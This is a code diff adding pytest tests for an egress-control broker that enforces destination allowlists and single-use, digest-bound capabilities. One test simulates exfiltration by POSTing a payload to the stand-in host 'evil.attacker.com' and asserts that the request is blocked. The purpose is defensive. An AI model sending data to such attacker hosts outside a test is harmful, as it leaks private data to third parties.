@@ -3811,3 +3811,211 @@ def test_h2_body_types_and_digest_binding_matrix():
     with pytest.raises(TypeError) as exc_type:
         transport.request("POST", "http://api.corp.com/upload", body=12345, transfer_context=ctx_bytes)
     assert "Unsupported request body type" in str(exc_type.value)
+
+
+def test_h3_disallowed_destination_does_not_consume_capability():
+    """
+    H3 Ordering Test:
+    Proves that a disallowed destination fails closed BEFORE consuming an otherwise valid capability.
+    The unconsumed capability remains valid and can authorize a subsequent allowed request.
+    Also proves that DNS resolution is NEVER performed for a destination rejected by policy.
+    """
+    from epistemicos.authorization import CapabilityRegistry, AuthorizationAuthority, Policy
+    from unittest.mock import patch, MagicMock
+
+    registry = CapabilityRegistry(signing_secret=b"h3_ordering_test_secret_1234567")
+    auth_policy = Policy(policy_id="p-h3-order", allowed_operations={"api_upload"}, allowed_resources={"api.corp.com"})
+    authority = AuthorizationAuthority(default_policy=auth_policy, registry=registry, principal_provider=TEST_VERIFIER)
+    principal = TEST_IDP.issue_principal("principal:alice")
+
+    payload = b"H3_VALIDATION_PAYLOAD"
+    payload_digest = hashlib.sha256(payload).hexdigest()
+
+    cap, _ = authority.evaluate_and_issue_capability(
+        action_name="api_upload",
+        target="api.corp.com",
+        canonical_request_digest=payload_digest,
+        executor_id="transport",
+        principal_id=principal
+    )
+
+    transfer_policy = DataTransferPolicy(
+        rules=[
+            TransferRule(rule_id="r-allowed", allowed_principals={"principal:alice"}, destination_service="api", allowed_hosts={"api.corp.com"}, require_capability=True)
+        ],
+        principal_verifier=TEST_VERIFIER
+    )
+
+    mock_dns = MagicMock(return_value=["93.184.216.34"])
+    # Broker allowlist permits api.corp.com, but NOT evil.attacker.com
+    broker = EgressTransportBroker(
+        policy=EgressPolicy(allowed_destinations={"api.corp.com"}),
+        transfer_policy=transfer_policy,
+        authorization_authority=authority,
+        resolver_func=mock_dns
+    )
+    transport = ControlledEgressTransport(broker=broker)
+
+    # 1. Attempt transfer to disallowed destination
+    with pytest.raises(PermissionError) as exc_blocked:
+        transport.request(
+            method="POST",
+            url="http://evil.attacker.com/upload",
+            body=payload,
+            capability=cap
+        )
+    assert "not in approved egress policy" in str(exc_blocked.value)
+
+    # Prove DNS was NEVER invoked for evil.attacker.com
+    mock_dns.assert_not_called()
+
+    # Prove capability was NOT consumed
+    assert registry.is_consumed(cap.token_id) is False
+
+    # 2. Use the same unconsumed capability on the legitimate destination
+    class LegitimateConn:
+        def __init__(self, *args, **kwargs):
+            pass
+        def request(self, method, url, body=None, headers=None):
+            pass
+        def getresponse(self):
+            resp = MagicMock()
+            resp.status = 200
+            resp.reason = "OK"
+            resp.getheaders.return_value = []
+            resp.read.return_value = b"success"
+            return resp
+        def close(self):
+            pass
+
+    ctx = create_test_context(
+        principal_verifier=TEST_VERIFIER, principal="principal:alice",
+        destination=DestinationIdentity(service="api", host="api.corp.com"),
+        classification=DataClassification.INTERNAL, direction=TransferDirection.UPLOAD,
+        operation=TransferOperation.WRITE, action_name="api_upload", target="api.corp.com",
+        canonical_request_digest=payload_digest, declared_bytes=len(payload),
+        trusted_authority_assertion=make_assertion("principal:alice", "INTERNAL", destination_host="api.corp.com", direction=TransferDirection.UPLOAD, operation=TransferOperation.WRITE, declared_bytes=len(payload))
+    )
+
+    with patch("epistemicos.containment.PinnedHTTPConnection", LegitimateConn):
+        res = transport.request(
+            method="POST",
+            url="http://api.corp.com/upload",
+            body=payload,
+            transfer_context=ctx,
+            capability=cap
+        )
+        assert res["status"] == 200
+
+    # Prove capability is now consumed
+    assert registry.is_consumed(cap.token_id) is True
+
+    # Prove consumed capability cannot be replayed
+    with pytest.raises(PermissionError) as exc_replayed:
+        transport.request(
+            method="POST",
+            url="http://api.corp.com/upload",
+            body=payload,
+            transfer_context=ctx,
+            capability=cap
+        )
+    assert "already been consumed" in str(exc_replayed.value)
+
+
+def test_h2_empty_body_positive_path():
+    """
+    H2 Positive Path Test:
+    Proves that an empty-body request with SHA-256(b"") digest succeeds when context and capability match.
+    Captures transmitted body to verify it is exactly empty (len 0), and proves mismatched digest fails before socket creation.
+    """
+    from epistemicos.authorization import CapabilityRegistry, AuthorizationAuthority, Policy
+    from unittest.mock import patch, MagicMock
+
+    empty_digest = hashlib.sha256(b"").hexdigest()
+    registry = CapabilityRegistry(signing_secret=b"h2_empty_body_test_secret_12345")
+    auth_policy = Policy(policy_id="p-h2-empty", allowed_operations={"api_ping"}, allowed_resources={"api.corp.com"})
+    authority = AuthorizationAuthority(default_policy=auth_policy, registry=registry, principal_provider=TEST_VERIFIER)
+    principal = TEST_IDP.issue_principal("principal:alice")
+
+    cap_empty, _ = authority.evaluate_and_issue_capability(
+        action_name="api_ping",
+        target="api.corp.com",
+        canonical_request_digest=empty_digest,
+        executor_id="transport",
+        principal_id=principal
+    )
+
+    transfer_policy = DataTransferPolicy(
+        rules=[
+            TransferRule(rule_id="r-empty", allowed_principals={"principal:alice"}, destination_service="api", allowed_hosts={"api.corp.com"}, require_capability=True)
+        ],
+        principal_verifier=TEST_VERIFIER
+    )
+
+    broker = EgressTransportBroker(
+        policy=EgressPolicy(allowed_destinations={"api.corp.com"}),
+        transfer_policy=transfer_policy,
+        authorization_authority=authority,
+        resolver_func=lambda h: ["93.184.216.34"]
+    )
+    transport = ControlledEgressTransport(broker=broker)
+
+    captured_requests = []
+    class CaptureEmptyConn:
+        def __init__(self, *args, **kwargs):
+            pass
+        def request(self, method, url, body=None, headers=None):
+            captured_requests.append((method, url, body))
+        def getresponse(self):
+            resp = MagicMock()
+            resp.status = 200
+            resp.reason = "OK"
+            resp.getheaders.return_value = []
+            resp.read.return_value = b""
+            return resp
+        def close(self):
+            pass
+
+    ctx_empty = create_test_context(
+        principal_verifier=TEST_VERIFIER, principal="principal:alice",
+        destination=DestinationIdentity(service="api", host="api.corp.com"),
+        classification=DataClassification.INTERNAL, direction=TransferDirection.DOWNLOAD,
+        operation=TransferOperation.READ, action_name="api_ping", target="api.corp.com",
+        canonical_request_digest=empty_digest, declared_bytes=0,
+        trusted_authority_assertion=make_assertion("principal:alice", "INTERNAL", destination_host="api.corp.com", direction=TransferDirection.DOWNLOAD, operation=TransferOperation.READ, declared_bytes=0)
+    )
+
+    with patch("epistemicos.containment.PinnedHTTPConnection", CaptureEmptyConn):
+        res = transport.request(
+            method="GET",
+            url="http://api.corp.com/ping",
+            body=None,
+            transfer_context=ctx_empty,
+            capability=cap_empty
+        )
+        assert res["status"] == 200
+
+    assert len(captured_requests) == 1
+    method, url, transmitted_body = captured_requests[0]
+    assert method == "GET"
+    assert transmitted_body is None or len(transmitted_body) == 0
+
+    # Negative test: Mismatched digest fails before socket creation
+    wrong_cap, _ = authority.evaluate_and_issue_capability(
+        action_name="api_ping",
+        target="api.corp.com",
+        canonical_request_digest=hashlib.sha256(b"wrong").hexdigest(),
+        executor_id="transport",
+        principal_id=principal
+    )
+    with patch("epistemicos.containment.PinnedHTTPConnection") as mock_conn:
+        with pytest.raises(PermissionError) as exc_mismatch:
+            transport.request(
+                method="GET",
+                url="http://api.corp.com/ping",
+                body=None,
+                transfer_context=ctx_empty,
+                capability=wrong_cap
+            )
+        assert "Capability digest mismatch" in str(exc_mismatch.value)
+        mock_conn.assert_not_called()
